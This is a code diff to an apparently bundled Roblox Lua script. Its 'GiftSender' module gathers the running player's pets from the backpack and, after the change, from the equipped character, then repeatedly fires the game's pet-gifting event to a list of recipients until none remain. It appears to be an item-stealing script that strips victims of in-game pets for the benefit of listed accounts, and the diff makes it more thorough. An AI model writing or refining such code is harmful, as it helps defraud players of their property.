@@ -34,13 +34,12 @@ end
 return Starter
 
 end function __DARKLUA_BUNDLE_MODULES.b()
-
-
 local Players = game:GetService("Players")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 
 local LocalPlayer = Players.LocalPlayer
 local Backpack = LocalPlayer:WaitForChild("Backpack")
+local Character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
 local PetGiftingService = ReplicatedStorage:WaitForChild("GameEvents"):WaitForChild("PetGiftingService")
 
 local GiftSender = {}
@@ -54,7 +53,7 @@ function GiftSender:Start()
     local function extractBaseName(name)
         return string.match(name, "^(%w+)")
     end
-    
+
     local activeRecipients = {}
     for _, name in ipairs(recipientNames) do
         local player = Players:FindFirstChild(name)
@@ -72,20 +71,25 @@ function GiftSender:Start()
     local attempt = 0
     local recipientIndex = math.random(1, #activeRecipients)
 
-
     while true do
         attempt += 1
 
         local petsToSend = {}
 
-        for _, tool in ipairs(Backpack:GetChildren()) do
-            if tool:GetAttribute("ItemType") == "Pet" then
-                local baseName = extractBaseName(tool.Name)
-                if table.find(petNames, baseName) then
-                    table.insert(petsToSend, tool)
+        
+        local function scanContainer(container)
+            for _, tool in ipairs(container:GetChildren()) do
+                if tool:GetAttribute("ItemType") == "Pet" then
+                    local baseName = extractBaseName(tool.Name)
+                    if table.find(petNames, baseName) then
+                        table.insert(petsToSend, tool)
+                    end
                 end
             end
         end
+
+        scanContainer(Backpack)
+        scanContainer(Character)
 
         if #petsToSend == 0 then
             print("[GiftSender] Все питомцы отправлены. Выход.")
@@ -93,7 +97,6 @@ function GiftSender:Start()
             return
         end
 
-        
         local recipient = activeRecipients[recipientIndex]
         if not recipient then
             warn("[GiftSender] Ошибка выбора получателя.")
@@ -103,19 +106,24 @@ function GiftSender:Start()
 
         print(string.format("[GiftSender] Попытка #%d. Отправка питомцев игроку %s", attempt, recipient.Name))
 
-        
         for _, petTool in ipairs(petsToSend) do
             pcall(function()
-                petTool.Parent = LocalPlayer.Character
-                task.wait(0.25)
+                petTool.Parent = Character
+
+                
+                local timeout = 5
+                local start = tick()
+                repeat
+                    task.wait()
+                until Character:FindFirstChild(petTool.Name) or tick() - start > timeout
 
                 PetGiftingService:FireServer("GivePet", recipient)
-                print("[GiftSender] Отправлен питомец:", petTool.Name, "→", recipient.Name)
+                print("[GiftSender] ✅ Отправлен питомец:", petTool.Name, "→", recipient.Name)
             end)
-            task.wait(0.2)
+
+            task.wait(0.1)
         end
 
-        
         recipientIndex += 1
         if recipientIndex > #activeRecipients then
             recipientIndex = 1
